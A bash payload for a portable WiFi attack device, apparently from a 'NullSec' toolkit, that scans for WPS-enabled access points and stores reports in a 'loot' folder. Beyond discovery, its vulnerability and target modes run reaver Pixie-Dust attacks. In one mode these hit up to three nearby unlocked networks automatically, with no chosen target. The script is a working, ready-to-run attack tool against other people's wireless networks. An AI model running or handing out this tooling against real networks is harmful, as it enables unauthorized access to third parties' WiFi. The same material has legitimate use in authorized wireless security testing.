#!/bin/bash
# Title: WPS Scanner
# Author: NullSec
# Description: Scan for WPS-enabled networks and identify vulnerable implementations
# Category: nullsec/recon

LOOT_DIR="/mmc/nullsec/wpsscanner"
mkdir -p "$LOOT_DIR"

PROMPT "WPS SCANNER

Scan for WiFi Protected
Setup (WPS) enabled APs.

Features:
- WPS AP discovery
- Locked/unlocked status
- Version detection
- Vulnerability check
- Pixie-Dust detection

Press OK to configure."

# Find monitor interface
MONITOR_IF=""
for iface in wlan1mon wlan2mon mon0; do
    [ -d "/sys/class/net/$iface" ] && MONITOR_IF="$iface" && break
done
[ -z "$MONITOR_IF" ] && { ERROR_DIALOG "No monitor interface!

Enable monitor mode:
airmon-ng start wlan1"; exit 1; }

# Check for wash/reaver
HAS_WASH=0
HAS_REAVER=0
command -v wash >/dev/null 2>&1 && HAS_WASH=1
command -v reaver >/dev/null 2>&1 && HAS_REAVER=1

[ $HAS_WASH -eq 0 ] && [ $HAS_REAVER -eq 0 ] && {
    ERROR_DIALOG "wash/reaver not found!

Install with:
opkg install reaver"
    exit 1
}

PROMPT "SCAN MODE:

1. Quick WPS discovery
2. Detailed WPS info
3. Vulnerability assess
4. Target-specific check

Tools: $([ $HAS_WASH -eq 1 ] && echo wash)$([ $HAS_REAVER -eq 1 ] && echo " reaver")
Interface: $MONITOR_IF

Select mode next."

WPS_MODE=$(NUMBER_PICKER "Mode (1-4):" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) WPS_MODE=1 ;; esac

DURATION=$(NUMBER_PICKER "Scan time (seconds):" 60)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=60 ;; esac
[ $DURATION -lt 15 ] && DURATION=15
[ $DURATION -gt 300 ] && DURATION=300

TARGET_BSSID=""
if [ "$WPS_MODE" -eq 4 ]; then
    TARGET_BSSID=$(TEXT_PICKER "Target BSSID:" "AA:BB:CC:DD:EE:FF")
    TARGET_CH=$(NUMBER_PICKER "Target channel:" 6)
fi

resp=$(CONFIRMATION_DIALOG "START WPS SCAN?

Mode: $WPS_MODE
Duration: ${DURATION}s
Interface: $MONITOR_IF
$([ -n "$TARGET_BSSID" ] && echo "Target: $TARGET_BSSID")

Confirm?")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

TIMESTAMP=$(date +%Y%m%d_%H%M)
REPORT="$LOOT_DIR/wps_scan_$TIMESTAMP.txt"
RAW_LOG="$LOOT_DIR/wps_raw_$TIMESTAMP.log"

LOG "Scanning for WPS networks..."
SPINNER_START "Scanning WPS APs..."

echo "=======================================" > "$REPORT"
echo "      NULLSEC WPS SCAN REPORT          " >> "$REPORT"
echo "=======================================" >> "$REPORT"
echo "" >> "$REPORT"
echo "Scan Time: $(date)" >> "$REPORT"
echo "Duration: ${DURATION}s" >> "$REPORT"
echo "Interface: $MONITOR_IF" >> "$REPORT"
echo "" >> "$REPORT"

WPS_COUNT=0
VULN_COUNT=0

if [ "$WPS_MODE" -eq 4 ] && [ -n "$TARGET_BSSID" ]; then
    # Target-specific scan
    echo "--- TARGET WPS CHECK ---" >> "$REPORT"
    echo "Target: $TARGET_BSSID (Ch: $TARGET_CH)" >> "$REPORT"
    echo "" >> "$REPORT"

    iwconfig "$MONITOR_IF" channel "$TARGET_CH" 2>/dev/null

    if [ $HAS_WASH -eq 1 ]; then
        timeout "$DURATION" wash -i "$MONITOR_IF" -c "$TARGET_CH" 2>/dev/null > "$RAW_LOG"
        grep "$TARGET_BSSID" "$RAW_LOG" >> "$REPORT"
    fi

    if [ $HAS_REAVER -eq 1 ]; then
        echo "" >> "$REPORT"
        echo "Reaver probe:" >> "$REPORT"
        timeout 30 reaver -i "$MONITOR_IF" -b "$TARGET_BSSID" -c "$TARGET_CH" -vv -K 1 2>&1 | \
            head -30 >> "$REPORT"
    fi
else
    # General WPS discovery
    echo "--- WPS-ENABLED NETWORKS ---" >> "$REPORT"
    echo "" >> "$REPORT"

    if [ $HAS_WASH -eq 1 ]; then
        timeout "$DURATION" wash -i "$MONITOR_IF" 2>/dev/null > "$RAW_LOG"

        echo "BSSID             | Ch | RSSI | WPS | Locked | ESSID" >> "$REPORT"
        echo "------------------|----|----- |-----|--------|------" >> "$REPORT"

        while read -r line; do
            [ -z "$line" ] && continue
            [[ "$line" == *"BSSID"* ]] && continue
            [[ "$line" == *"---"* ]] && continue

            echo "$line" >> "$REPORT"
            WPS_COUNT=$((WPS_COUNT + 1))

            # Check for unlocked WPS (vulnerable)
            if echo "$line" | grep -qi "no\|unlocked"; then
                VULN_COUNT=$((VULN_COUNT + 1))
            fi
        done < "$RAW_LOG"
    else
        # Fallback: use airodump + grep for WPS
        CAP_PREFIX="/tmp/wps_cap_$$"
        timeout "$DURATION" airodump-ng "$MONITOR_IF" --wps -w "$CAP_PREFIX" --output-format csv 2>/dev/null &
        SCAN_PID=$!
        sleep "$DURATION"
        kill $SCAN_PID 2>/dev/null
        wait $SCAN_PID 2>/dev/null

        grep -i "WPS" "${CAP_PREFIX}"*.csv 2>/dev/null >> "$REPORT"
        WPS_COUNT=$(grep -ci "WPS" "${CAP_PREFIX}"*.csv 2>/dev/null || echo 0)
        rm -f "${CAP_PREFIX}"* 2>/dev/null
    fi
fi

# Vulnerability assessment
if [ "$WPS_MODE" -ge 3 ] && [ $HAS_REAVER -eq 1 ]; then
    echo "" >> "$REPORT"
    echo "--- VULNERABILITY ASSESSMENT ---" >> "$REPORT"
    echo "" >> "$REPORT"

    # Test top 3 unlocked WPS APs
    grep -i "no\|unlocked" "$RAW_LOG" 2>/dev/null | head -3 | while read -r line; do
        BSSID=$(echo "$line" | awk '{print $1}')
        CH=$(echo "$line" | awk '{print $2}')
        [ -z "$BSSID" ] && continue

        echo "Testing: $BSSID (Ch $CH)" >> "$REPORT"
        # Quick Pixie-Dust test
        RESULT=$(timeout 30 reaver -i "$MONITOR_IF" -b "$BSSID" -c "$CH" -K 1 -vv 2>&1 | tail -5)
        echo "$RESULT" >> "$REPORT"
        echo "" >> "$REPORT"
    done
fi

echo "" >> "$REPORT"
echo "=======================================" >> "$REPORT"

SPINNER_STOP

PROMPT "WPS SCAN COMPLETE

WPS APs found: $WPS_COUNT
Potentially vuln: $VULN_COUNT

Report saved:
$REPORT

Press OK to exit."
